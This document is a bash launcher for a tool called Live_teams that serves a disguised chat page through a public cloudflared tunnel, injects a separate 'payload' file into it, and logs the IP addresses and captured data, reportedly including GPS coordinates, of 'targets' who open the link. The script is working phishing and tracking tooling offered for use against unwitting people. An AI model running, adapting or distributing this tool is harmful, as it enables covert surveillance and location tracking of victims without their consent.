#!/bin/bash
# Live_teams
# Powered by techteams
# visit https:techteams.online

trap 'printf "\n";stop' 2

    banner(){
    clear
    printf '\n      88888888888                888    88888888888                                       \n'                                      
    printf '          888                    888        888                                           \n'                                      
    printf '          888                    888        888                                           \n'                                      
    printf '          888   .d88b.   .d8888b 88888b.    888   .d88b.   8888b.  88888b.d88b.  .d8888b  \n'
    printf '          888  d8P  Y8b d88P"    888 "88b   888  d8P  Y8b     "88b 888 "888 "88b 88K      \n'
    printf '          888  88888888 888      888  888   888  88888888 .d888888 888  888  888 "Y8888b. \n'
    printf '          888  Y8b.     Y88b.    888  888   888  Y8b.     888  888 888  888  888      X88 \n'
    printf '          888   "Y8888   "Y8888P 888  888   888   "Y8888  "Y888888 888  888  888  88888P  \n'
    printf '                                                                       by Deepak Kumar \n\n'                                                                                                                                                                                                                         
    printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'                                                                                
    printf " \e[1;93m                           Live_teams 0.1 - by Deepak Kumar [Techteams]\e[0m \n"
    printf " \e[1;92m                           www.techteams.online | youtube.com/techteams05 \e[0m \n"
    printf "\e[1;90m         Techteams is a simple and light tool for information gathering and capture GPS coordinates.\e[0m \n"
    printf "\n"
    }

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; } 

}

stop() {
checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkcf == *'cloudflared'* ]]; then
pkill -f -2 cloudflared > /dev/null 2>&1
killall -2 cloudflared > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
}

catch_ip() {

ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
cat ip.txt >> saved.ip.txt

}

checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
tail -f -n 110 data.txt
fi
sleep 0.5
done 
}


cf_server() {

if [[ -e cloudflared ]]; then
echo "Cloudflared already installed."
else
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
arch=$(uname -m)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
elif [[ "$arch" == *'aarch64'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
elif [[ "$arch" == *'x86_64'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
else
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1 
fi
fi
chmod +x cloudflared
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
rm cf.log > /dev/null 2>&1 &
./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
sleep 10
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
exit 1
else
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
fi
sed 's+forwarding_link+'$link'+g' template.php > index.php
checkfound
}

local_server() {
sed 's+forwarding_link+''+g' template.php > index.php
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on Localhost:8080...\n"
php -S 127.0.0.1:8080 > /dev/null 2>&1 & 
sleep 2
checkfound
}
Live_teams() {
if [[ -e data.txt ]]; then
cat data.txt >> targetreport.txt
rm -rf data.txt
touch data.txt
fi
if [[ -e ip.txt ]]; then
rm -rf ip.txt
fi
sed -e '/tc_payload/r payload' index_chat.html > index.html
default_option_server="Y"
read -p $'\n\e[1;93m Do you want to use cloudflared tunnel?\n \e[1;92motherwise it will be run on localhost:8080 [Default is Y] [Y/N]: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
cf_server
sleep 1
else
local_server
sleep 1
fi
}

banner
dependencies
Live_teams
